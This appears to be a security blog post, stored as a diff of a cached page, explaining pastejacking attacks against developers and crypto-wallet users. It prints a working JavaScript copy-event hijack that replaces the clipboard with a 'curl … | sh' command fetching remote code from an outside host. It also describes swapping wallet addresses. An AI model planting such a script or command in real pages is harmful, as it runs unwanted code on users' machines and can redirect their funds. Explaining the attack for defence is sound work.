@@ -1,0 +1,46 @@
+I"�<p>The last several years have brought incredible gains in the number of cyberattacks waged. These attacks entail a variety of exploits, with some using methods as simple as social engineering. Human behavior is often the weakest link, and a particular javascript exploit takes advantage of trust in a computer’s copy-and-paste functionality.  This form of attack, commonly referred to as <a href="https://www.geeksforgeeks.org/what-is-pastejacking/">pastejacking</a>, can fit into many different cyberattack campaigns. This attack takes advantage of one of the most common user interactions with a computer.</p>
+
+<p>Pastejacking attacks exploit temporary storage memory by replacing copied data stored in device memory with different, often malicious, data. This exploit may take the form of a client-side or a server-side attack.</p>
+
+<p>Server-side pastejacking attacks may fit within a software supply chain attack: attackers can manipulate a compromised entity to attack downstream users or clients. 
+Using methods such as <a href="https://owasp.org/www-community/attacks/DOM_Based_XSS">cross-site scripting (XSS) attacks</a>, an attacker can wage client-side pastejacking attacks, which can be especially effective if targeting developers. Cyberattacks waged on developers often have a high return on investment because capturing developer credentials affords an attacker a significant amount of lateral movement throughout an organization.</p>
+
+<h2 id="how-javascript-pastejacking-works">How Javascript Pastejacking Works</h2>
+
+<p>For demonstration purposes, let’s take a look at the following Javascript code snippet:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;script&gt;
+document.getElementById('copied-text').addEventListener('copy', 
+function(e) {
+    e.clipboardData.setData('text/plain', 
+        'curl https://forkbomb.io/shadowrealm | sh\n'
+    );
+    e.preventDefault();
+});
+&lt;/script&gt;
+</code></pre></div></div>
+
+<p>Attackers may execute this code through various means; this attack may be waged on an organization through a form of code tampering or used on individual users through a client-side injection attack.</p>
+
+<h2 id="using-pastejacking-to-attack-developers">Using Pastejacking to Attack Developers</h2>
+
+<p>Let’s say a junior programmer is attempting to utilize a code snippet from StackOverflow, which is not an unusual scenario that most software engineers have done at some point in their career. A malicious entity wages an attack against users trying to copy and paste a code snippet from the web browser into their terminal.</p>
+
+<p>The javascript function as defined above replaces the copied text within the clipboard, thus overriding the in-memory data and replacing it with:</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl https://forkbomb.io/shadowRealm | sh\n
+</code></pre></div></div>
+<p>This string is a curl command that navigates a user to the URL https://forkbomb.io/shadowRealm, which in this case is a striking yet graceful warning to users.</p>
+
+<p>Because the pasted snippet includes the string sh\n, the command runs immediately as if the user had manually pressed the return key, thus preventing a user from realizing what is happening until the attack is underway.</p>
+
+<p>This form of attack can be hazardous as this can be a form of <a href="https://cycode.com/blog/why-developers-are-hackers-new-targets-and-what-to-do-about-it/">targeting developers</a> who often have elevated credentials. Malicious actors may use a pastejacking attack within systems that do not adhere to principles of least privilege. Developer credentials often allow escalated privileges to accelerate developer velocity. Allowing for greater access within a development ecosystem reduces security between components, thus permitting lateral movement that can give an attacker full access to an organization’s data. This can allow attackers to perform data exfiltration or leak source code; in either case, this will be devastating for an organization’s reputation and finances.</p>
+
+<h2 id="using-pastejacking-to-attack-crypto-wallets">Using Pastejacking to Attack Crypto Wallets</h2>
+
+<p>More nefarious, if subtle, applications of this technique exist. Let’s consider crypto wallet addresses. These addresses are 26-35 characters long and consist of alphanumeric values. This address is often copied and pasted from one application to another to send crypto assets from one wallet to another. This copy and paste pattern provides a window of opportunity for attackers to wage a client-side injection attack utilizing such a script as defined above.</p>
+
+<p>Metamask is a popular crypto wallet commonly used for NFT transactions and blockchain applications. This wallet provides convenience to users by existing both in-browser and as a Google Chrome extension. One of the most convenient features is the fact that users can easily copy their crypto wallet address with a single click:</p>
+
+<p>You can probably see where this is going. An insecure website, or nefarious browser extension, running this javascript copy-injection could hijack a user’s transaction by replacing the presented contract address text with another one, such as the attacker’s address, thus redirecting funds to their wallet permanently.</p>
+
+<p>In the case of Metamask, tools such as LavaMoat are used to prevent software supply chain attacks from being deployed directly on its user base. However, as long as gaps within DevSecOps exist, attackers will find a way to wage attacks on users. Other means of attack, such as cross-site scripting attacks, are still viable pathways to reach individual users.</p>
+:ET
